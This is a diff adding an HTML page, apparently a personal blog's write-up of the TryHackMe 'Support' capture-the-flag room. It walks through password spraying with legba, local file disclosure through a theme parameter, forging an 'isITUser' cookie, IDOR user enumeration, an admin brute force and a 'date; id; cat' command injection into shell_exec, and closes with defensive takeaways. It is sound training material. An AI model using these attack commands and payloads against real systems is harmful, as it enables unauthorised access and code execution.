@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support — TryHackMe Writeup — Maks Huseynli</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:         #0b0f14;
+      --bg-2:       #0f1419;
+      --bg-3:       #141b22;
+      --bg-code:    #0d1117;
+      --border:     #1e2730;
+      --border-2:   #253040;
+      --text:       #c8d0da;
+      --text-dim:   #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:     #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:      #34c759;
+      --yellow:     #ff9f0a;
+      --red:        #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; letter-spacing: 0.02em; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 600px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+    .info-value a { color: var(--accent); text-decoration: none; }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; letter-spacing: -0.01em; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+    .section code { font-family: var(--mono); font-size: 12px; color: #a0b8cc; background: rgba(255,255,255,0.03); padding: 1px 5px; border-radius: 3px; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+    .callout code { font-family: var(--mono); font-size: 12px; background: rgba(255,255,255,0.04); padding: 1px 5px; border-radius: 3px; }
+
+    .ports { display: flex; gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .port { flex: 1; background: var(--bg-2); padding: 18px 14px; text-align: center; }
+    .port-num { font-family: var(--mono); font-size: 17px; color: var(--accent); font-weight: 500; }
+    .port-svc { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-top: 4px; }
+    .port-note { font-size: 10px; color: var(--text-faint); margin-top: 3px; }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .ports { flex-direction: column; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#case-studies" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">Access Control</span>
+    <span class="badge badge-d">Medium</span>
+  </div>
+  <h1><strong>Support</strong></h1>
+  <p class="hero-desc">A "Support Operations Panel" that supports everything except actually checking who you are. Password spraying for a foothold, a theme-switcher hiding a local file disclosure, a cookie that grants you the IT department by hashing the word "true", IDOR to an admin account, and a date command that does a lot more than tell the time.</p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Medium</span></div>
+    <div class="info-item"><span class="info-label">Category</span><span class="info-value">Web / Access Control</span></div>
+    <div class="info-item"><span class="info-label">Room</span><span class="info-value"><a href="https://tryhackme.com/room/support" target="_blank" rel="noopener">tryhackme.com/room/support</a></span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Network Reconnaissance</h2>
+    <p>Standard opener — a SYN scan with service and default-script detection to map the attack surface before touching anything.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+sudo nmap -sS -sV -sC -F -T4 <span class="ca">&lt;TARGET_IP&gt;</span>
+<span class="ck"># -sS stealth SYN  -sV versions  -sC default scripts  -F fast (top 100)</span></code></pre>
+    <div class="ports">
+      <div class="port"><div class="port-num">22</div><div class="port-svc">SSH</div><div class="port-note">OpenSSH 9.6p1 — creds parking lot</div></div>
+      <div class="port"><div class="port-num">80</div><div class="port-svc">HTTP</div><div class="port-note">Apache 2.4.58 — "Support Operations Panel"</div></div>
+    </div>
+    <div class="callout blue"><strong>Note from nmap:</strong> the <code>PHPSESSID</code> cookie ships <em>without</em> the <code>HttpOnly</code> flag. Not the vuln we end up using, but it's the kind of detail that tells you the devs were in a hurry. Two ports, a PHP app, and a login page titled like a corporate help desk. Everything interesting lives on port 80.</div>
+  </section>
+
+  <section class="section" id="enum">
+    <div class="s-num">02</div>
+    <h2>Port 80 — Web Enumeration</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">port 80 — landing page</span></div>
+      <img src="support.png" alt="Support Operations Panel login page — Employee Authentication form" loading="lazy" />
+      <div class="sc">The front door: "Employee Authentication." Note the helpful hint — "Contact IT Operations @ help@support.thm." They just handed us a valid username. Thanks, IT.</div>
+    </div>
+    <p>The landing page is a login form for an internal "Support Operations Panel." Before throwing credentials at it, I mapped the directory structure with <code>dirsearch</code> and then confirmed with <code>ffuf</code> + a <code>.php</code> extension list.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+dirsearch -u http://<span class="ca">&lt;TARGET_IP&gt;</span>
+
+<span class="ck"># interesting hits</span>
+302  /api.php        -&gt; index.php
+200  /config.php     <span class="ck"># empty body... for now</span>
+302  /dashboard.php  -&gt; index.php
+200  /footer.php
+200  /info.php       <span class="cr"># 73KB — that's a phpinfo() smell</span>
+302  /user/0  /user/1  /user/2  /user/3   -&gt; index.php</code></pre>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ffuf -u http://<span class="ca">&lt;TARGET_IP&gt;</span>/<span class="ca">FUZZ</span> \
+     -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .php</code></pre>
+    <div class="callout blue"><strong>Map of the building:</strong> an <code>api.php</code> and a clutch of <code>/user/N</code> endpoints that all 302 back to login (no session yet), a <code>dashboard.php</code> behind auth, and a <code>footer.php</code> that renders standalone. Four numbered user endpoints is basically a neon sign reading "IDOR this way" — filed away for later.</div>
+  </section>
+
+  <section class="section" id="infodisclosure">
+    <div class="s-num">03</div>
+    <h2>Information Disclosure — info.php</h2>
+    <p>A 73&nbsp;KB response with no auth gate is almost always <code>phpinfo()</code>, and it was. Left in production it leaks the full PHP configuration, loaded modules, absolute paths, and environment — a free recon dump for the attacker and a "we forgot to delete this" badge for the defenders.</p>
+    <pre><code><div class="ph"><span class="pl">http</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET http://<span class="ca">&lt;TARGET_IP&gt;</span>/info.php
+<span class="ck"># full phpinfo() — document root, modules, env vars, the works</span></code></pre>
+    <div class="callout yellow"><strong>Finding:</strong> <code>info.php</code> exposes <code>phpinfo()</code> to anyone with a browser. No credentials, no questions asked. It didn't carry the final blow on its own, but it confirmed absolute paths (handy later for the file read) and screamed "this app was deployed by someone who trusts the internet."</div>
+  </section>
+
+  <section class="section" id="api-probe">
+    <div class="s-num">04</div>
+    <h2>Probing the API</h2>
+    <p>Naturally I poked <code>api.php</code> directly. Unauthenticated it just bounces you to <code>index.php</code> — every method, every payload, GET, POST, JSON, OPTIONS. The API has opinions about who it talks to.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -i http://<span class="ca">&lt;TARGET_IP&gt;</span>/api.php
+<span class="cr">HTTP/1.1 302 Found</span>
+Location: index.php          <span class="ck"># "talk to the hand"</span>
+
+<span class="ck"># JSON, form data, OPTIONS — all the same 302. Need a session first.</span></code></pre>
+    <p>Dead end without a session. Which means we need credentials. And the login page so kindly gave us a username...</p>
+  </section>
+
+  <section class="section" id="bruteforce">
+    <div class="s-num">05</div>
+    <h2>Credential Brute Force — Helpdesk</h2>
+    <p>With <code>help@support.thm</code> handed to us on the login page, this becomes a single-user password spray. I used <code>legba</code> against the login POST, treating "no <em>Invalid credentials</em> string in the body" as the success condition.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+legba http \
+  -U <span class="cs">'help@support.thm'</span> \
+  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+  -T http://<span class="ca">&lt;TARGET_IP&gt;</span>/ \
+  --http-method POST \
+  --http-success <span class="cs">'!contains(body, "Invalid credentials")'</span> \
+  --http-payload <span class="cs">'email={USERNAME}&amp;password={PASSWORD}'</span> \
+  --single-match --concurrency 4 -Q
+
+<span class="cg">[+] username=help@support.thm password=$PASS</span>
+<span class="ck"># cracked in ~6 seconds — a top-10k password on a corporate panel. classic.</span></code></pre>
+    <div class="callout green"><strong>Foothold credentials:</strong> <code>help@support.thm</code> / <code>$PASS</code>. A password that lives in the first ten thousand lines of every wordlist on earth, guarding a "support operations" platform. The help desk could not, in fact, help itself.</div>
+  </section>
+
+  <section class="section" id="foothold">
+    <div class="s-num">06</div>
+    <h2>Foothold — Helpdesk Dashboard</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">authenticated — helpdesk dashboard</span></div>
+      <img src="support2.png" alt="Support Dashboard logged in as Helpdesk User with a theme selector" loading="lazy" />
+      <div class="sc">"Welcome, Helpdesk User." A ticket box and a <em>Select Theme</em> dropdown. That theme switcher is the most dangerous-looking innocent feature on the box — hold that thought.</div>
+    </div>
+    <p>Logged in, the dashboard is sparse: a ticket panel and a cosmetic theme selector in the footer. Re-probing <code>api.php</code> with our shiny session still slaps us down — this time with a different message:</p>
+    <pre><code><div class="ph"><span class="pl">http — burp</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET /api.php   <span class="ck"># now authenticated</span>
+HTTP/1.1 200 OK
+<span class="cr">Access denied</span>           <span class="ck"># progress! 302 -&gt; 200 + a real refusal</span></code></pre>
+    <div class="callout blue"><strong>Read the room:</strong> the response changed from a redirect to a 200 with <code>Access denied</code>. We're authenticated but not <em>authorized</em>. Something server-side is checking a second condition beyond "are you logged in." We need to see the source to know what.</div>
+  </section>
+
+  <section class="section" id="lfd">
+    <div class="s-num">07</div>
+    <h2>Local File Disclosure via the Theme Switcher</h2>
+    <p>That harmless <em>Select Theme</em> feature drives a parameter: <code>dashboard.php?skin=default</code>. Anything that loads a file by name off a query parameter is a path-traversal candidate. Pointing it at a relative path with no extension shows the skin handler happily <code>include</code>-ing arbitrary local files — and because the loaded PHP doesn't <em>execute</em> in this context, its raw source bleeds into the page. Classic Local File Disclosure (LFD).</p>
+    <pre><code><div class="ph"><span class="pl">http</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET /dashboard.php?skin=<span class="cr">../config</span>      <span class="ck"># -&gt; config.php source</span>
+GET /dashboard.php?skin=<span class="cr">../api</span>         <span class="ck"># -&gt; api.php source</span>
+GET /dashboard.php?skin=<span class="cr">../dashboard</span>   <span class="ck"># -&gt; dashboard.php source</span>
+GET /dashboard.php?skin=<span class="cr">../footer</span>      <span class="ck"># -&gt; footer.php source</span></code></pre>
+    <div class="callout red"><strong>Root cause:</strong> the <code>skin</code> parameter feeds straight into a file include with zero sanitization. The empty-bodied <code>config.php</code> from our earlier scan suddenly becomes very chatty when we read its <em>source</em> instead of executing it. We just got read access to the application's brain.</div>
+  </section>
+
+  <section class="section" id="loot">
+    <div class="s-num">08</div>
+    <h2>Source Code Loot</h2>
+    <p>First file on the list — <code>config.php</code>. It coughed up a master password and app metadata:</p>
+    <pre><code><div class="ph"><span class="pl">php — config.php (via LFD)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+&lt;?php
+$MASTER_PASSWORD = <span class="cs">'$PASS'</span>;
+$SITE_VER  = <span class="cs">'1.0'</span>;
+$SITE_NAME = <span class="cs">'support_portal'</span>;</code></pre>
+    <p>Then the prize — <code>api.php</code>. Reading its source tells us exactly <em>why</em> we kept getting <code>Access denied</code>, and how the <code>/user/N</code> endpoints work:</p>
+    <pre><code><div class="ph"><span class="pl">php — api.php (via LFD)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+session_start();
+if (!isset($_SESSION[<span class="cs">'loggedin'</span>])) {
+    header(<span class="cs">'Location: index.php'</span>); exit;
+}
+
+<span class="cr">if (($_COOKIE['isITUser'] ?? md5('false')) !== md5('true')) {
+    die('Access denied');
+}</span>
+
+include(<span class="cs">'/var/www/db.php'</span>);
+$id   = $_GET[<span class="cs">'id'</span>] ?? $_SESSION[<span class="cs">'user_id'</span>];
+$user = $users[$id] ?? null;
+
+if (preg_match(<span class="cs">'#^/user/#'</span>, $_SERVER[<span class="cs">'REQUEST_URI'</span>])) {
+    header(<span class="cs">'Content-Type: application/json'</span>);
+    unset($user[<span class="cs">'password'</span>]);
+    echo json_encode($user, JSON_PRETTY_PRINT);
+    exit;
+}</code></pre>
+    <div class="callout yellow"><strong>The whole game, in three lines:</strong> the "are you from IT?" check compares a cookie you fully control, <code>isITUser</code>, against <code>md5('true')</code>. That's a <em>fixed, public, identical-for-everyone-on-earth</em> value: <code>b326b5062b2f0e69046810717534cb09</code>. The lock comes with the key drawn on the door.</div>
+  </section>
+
+  <section class="section" id="bac">
+    <div class="s-num">09</div>
+    <h2>Broken Access Control — Becoming "IT"</h2>
+    <p>Authorization that trusts a client-side cookie isn't authorization — it's a suggestion. The server decides whether you're in the IT department based purely on a value you mail it. To promote ourselves, we just set the cookie to the well-known hash of the string <code>true</code>.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+echo -n true | md5sum
+<span class="cg">b326b5062b2f0e69046810717534cb09</span>
+
+<span class="ck"># add it to the request and the API stops sulking</span>
+Cookie: PHPSESSID=&lt;sess&gt;; isITUser=<span class="cg">b326b5062b2f0e69046810717534cb09</span></code></pre>
+    <div class="callout red"><strong>Broken Access Control:</strong> the role gate is enforced client-side via a guessable cookie. Proper checks must read the role from <em>server-side</em> session state the user can't forge — not from a hash the user computes for themselves. We are now, officially, "IT."</div>
+  </section>
+
+  <section class="section" id="idor">
+    <div class="s-num">10</div>
+    <h2>IDOR — Enumerating Users to Admin</h2>
+    <p>Remember those four <code>/user/N</code> endpoints from recon? With our IT cookie attached, they finally answer — and the <code>id</code> is a plain integer with no ownership check. Walk the IDs and the application happily reads out everyone's profile (minus the password field, which it politely <code>unset()</code>s).</p>
+    <pre><code><div class="ph"><span class="pl">http</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET /user/1 HTTP/1.1
+Cookie: PHPSESSID=&lt;sess&gt;; isITUser=b326b5062b2f0e69046810717534cb09
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+{
+    <span class="ca">"email"</span>: <span class="cs">"specialadmin@support.thm"</span>,
+    <span class="ca">"2FA"</span>:   false,
+    <span class="ca">"admin"</span>: <span class="cg">true</span>
+}</code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">internal user API — /user/1</span></div>
+      <img src="support3.png" alt="Internal User API returning specialadmin@support.thm with admin true and 2FA false" loading="lazy" />
+      <div class="sc">The Internal User API spilling <code>/user/1</code>: <code>specialadmin@support.thm</code>, <code>admin: true</code>, and — crucially — <code>2FA: false</code>. An admin account with no second factor is just a password away.</div>
+    </div>
+    <div class="callout blue"><strong>Two for one:</strong> IDOR hands us the admin's email <em>and</em> the fact that 2FA is disabled. The API strips the password, but it left the door wide enough to know exactly whom to target next.</div>
+  </section>
+
+  <section class="section" id="admin-brute">
+    <div class="s-num">11</div>
+    <h2>Targeted Wordlist → Admin Brute Force</h2>
+    <p>Reusing the master password from <code>config.php</code> against the admin login didn't work directly — but admins love <em>variations</em> of a known password. So instead of a generic list, I generated a target-specific one: seed John with the master password and apply rule-based mutations to spin up thousands of plausible variants.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># pass.txt = the master password from config.php</span>
+john --wordlist=pass.txt --stdout --rules:rockyou-30000 &gt; rockyou-30000.txt
+<span class="ck"># ~30k mutations of one password — leetspeak, suffixes, case flips, etc.</span></code></pre>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+legba http \
+  -U <span class="cs">'specialadmin@support.thm'</span> \
+  -P rockyou-30000.txt \
+  -T http://<span class="ca">&lt;TARGET_IP&gt;</span>/ \
+  --http-method POST \
+  --http-success <span class="cs">'!contains(body, "Invalid credentials")'</span> \
+  --http-payload <span class="cs">'email={USERNAME}&amp;password={PASSWORD}'</span> \
+  --single-match --concurrency 4 -Q
+
+<span class="cg">[+] username=specialadmin@support.thm password=$PASS</span></code></pre>
+    <div class="callout green"><strong>Cracked:</strong> the admin password was a trivial mutation of the master password — same root, minus a special character. Reusing the "master" secret as your personal password is how one leaked config file becomes a full admin takeover.</div>
+  </section>
+
+  <section class="section" id="admin">
+    <div class="s-num">12</div>
+    <h2>Admin Access &amp; First Flag</h2>
+    <p>Logging in as <code>specialadmin@support.thm</code> unlocks the admin view of the dashboard and the room's first flag. But the more interesting prize is what the admin role <em>enables</em> in the footer — so we go straight back to our LFD to read <code>footer.php</code> and see what admins get to do.</p>
+    <pre><code><div class="ph"><span class="pl">php — footer.php (via LFD)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+$isAdmin = $_SESSION[<span class="cs">'admin'</span>];
+if ($isAdmin &amp;&amp; $_SERVER[<span class="cs">'REQUEST_METHOD'</span>] === <span class="cs">'POST'</span> &amp;&amp; isset($_POST[<span class="cs">'sys'</span>])) {
+    $sys = $_POST[<span class="cs">'sys'</span>];
+    if (strpos($sys, <span class="cs">'date'</span>) === 0) {
+        <span class="cr">$output = shell_exec($sys);</span>   <span class="ck"># <-- hello, old friend</span>
+    } else {
+        $error = <span class="cs">'Only date command is allowed.'</span>;
+    }
+}</code></pre>
+    <div class="callout red"><strong>The footer "show the time" feature</strong> pipes a POST parameter straight into <code>shell_exec()</code>. The only "validation" is that the string must <em>start with</em> <code>date</code>. That's not a sandbox — that's a velvet rope you step around with a single <code>;</code>.</div>
+  </section>
+
+  <section class="section" id="rce">
+    <div class="s-num">13</div>
+    <h2>Command Injection → Flag</h2>
+    <p>The filter only checks that input <em>begins</em> with <code>date</code>. It says nothing about what comes after. So we satisfy the prefix, then chain our own commands with <code>;</code>. Intercepting the footer's POST in Burp and tweaking the <code>sys</code> parameter:</p>
+    <pre><code><div class="ph"><span class="pl">http — burp request</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+POST /dashboard.php HTTP/1.1
+Cookie: PHPSESSID=&lt;sess&gt;; isITUser=b326b5062b2f0e69046810717534cb09
+Content-Type: application/x-www-form-urlencoded
+
+<span class="ck"># url-decoded payload:</span>
+sys=date +<span class="cs">"%H:%M:%S"</span><span class="cr">; id; cat /home/ubuntu/user.txt</span></code></pre>
+    <pre><code><div class="ph"><span class="pl">http — response</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+&lt;pre class="mb-0"&gt;07:24:39
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<span class="cg">THM{$FLAG}</span>&lt;/pre&gt;</code></pre>
+    <div class="callout green"><strong>Chain complete.</strong> Nmap → info.php disclosure → password spray (helpdesk) → LFD via <code>skin</code> → leaked source &amp; master password → forged <code>isITUser</code> cookie → IDOR to admin → targeted brute force → admin <code>shell_exec()</code> command injection → code execution as <code>www-data</code> and the flag. The "date" command told us a lot more than the time. ✓</div>
+  </section>
+
+  <section class="section" id="takeaways">
+    <div class="s-num">14</div>
+    <h2>Key Takeaways</h2>
+    <div class="steps">
+      <div class="step"><div class="sn">01</div><div class="sb"><strong>Never ship <code>phpinfo()</code> or debug pages.</strong> <code>info.php</code> handed an unauthenticated attacker the full server configuration and absolute paths. Delete diagnostic files before deploy.</div></div>
+      <div class="step"><div class="sn">02</div><div class="sb"><strong>One weak password = one foothold.</strong> A top-10k password on a single known username fell in seconds. Enforce strong passwords and rate-limit authentication.</div></div>
+      <div class="step"><div class="sn">03</div><div class="sb"><strong>Don't load files from user input.</strong> The <code>skin</code> parameter flowed into an include with no allowlist, exposing application source and secrets. Map themes to a fixed server-side allowlist — never to a raw path.</div></div>
+      <div class="step"><div class="sn">04</div><div class="sb"><strong>Authorization belongs on the server.</strong> Gating the IT role on <code>isITUser == md5('true')</code> — a value the client computes — is no gate at all. Read roles from trusted server-side session state.</div></div>
+      <div class="step"><div class="sn">05</div><div class="sb"><strong>Object references need ownership checks.</strong> <code>/user/N</code> let us enumerate every account, including the admin, by incrementing an integer. Always verify the requester is allowed to see the object.</div></div>
+      <div class="step"><div class="sn">06</div><div class="sb"><strong>Allowlist commands, don't prefix-match them.</strong> <code>strpos($sys,'date')===0</code> let <code>date; cat ...</code> sail through into <code>shell_exec()</code>. Avoid shelling out entirely; if you must, use strict allowlists and argument arrays — never string concatenation.</div></div>
+      <div class="step"><div class="sn">07</div><div class="sb"><strong>Don't reuse the "master" secret.</strong> The admin password was a one-character mutation of the leaked master password. Unique, unrelated secrets keep one disclosure from cascading into total compromise.</div></div>
+    </div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#enum">02 — Web Enum</a></li>
+    <li><a href="#infodisclosure">03 — Info Disclosure</a></li>
+    <li><a href="#api-probe">04 — API Probe</a></li>
+    <li><a href="#bruteforce">05 — Brute Force</a></li>
+    <li><a href="#foothold">06 — Foothold</a></li>
+    <li><a href="#lfd">07 — LFD</a></li>
+    <li><a href="#loot">08 — Source Loot</a></li>
+    <li><a href="#bac">09 — Access Control</a></li>
+    <li><a href="#idor">10 — IDOR</a></li>
+    <li><a href="#admin-brute">11 — Admin Brute</a></li>
+    <li><a href="#admin">12 — Admin / Flag 1</a></li>
+    <li><a href="#rce">13 — Command Inj</a></li>
+    <li><a href="#takeaways">14 — Takeaways</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
